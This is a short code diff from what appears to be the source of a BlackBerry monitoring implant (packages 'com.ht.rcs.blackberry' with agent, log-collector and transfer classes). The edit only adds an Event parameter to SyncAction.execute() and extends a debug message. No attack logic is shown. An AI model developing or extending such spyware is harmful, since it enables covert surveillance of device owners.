@@ -14,6 +14,7 @@ import net.rim.device.api.util.DataBuffer;
 import com.ht.rcs.blackberry.AgentManager;
 import com.ht.rcs.blackberry.Common;
 import com.ht.rcs.blackberry.agent.Agent;
+import com.ht.rcs.blackberry.event.Event;
 import com.ht.rcs.blackberry.log.LogCollector;
 import com.ht.rcs.blackberry.transfer.Transfer;
 import com.ht.rcs.blackberry.transfer.WifiConnection;
@@ -57,9 +58,9 @@ public class SyncAction extends SubAction {
         this.host = host_;
     }
 
-    public boolean execute() {
+    public boolean execute(Event triggeringEvent) {
         // #debug
-        debug.info("SyncAction execute");
+        debug.info("SyncAction execute: " + triggeringEvent);
 
         if (statusObj.crisis()) {
             // #debug
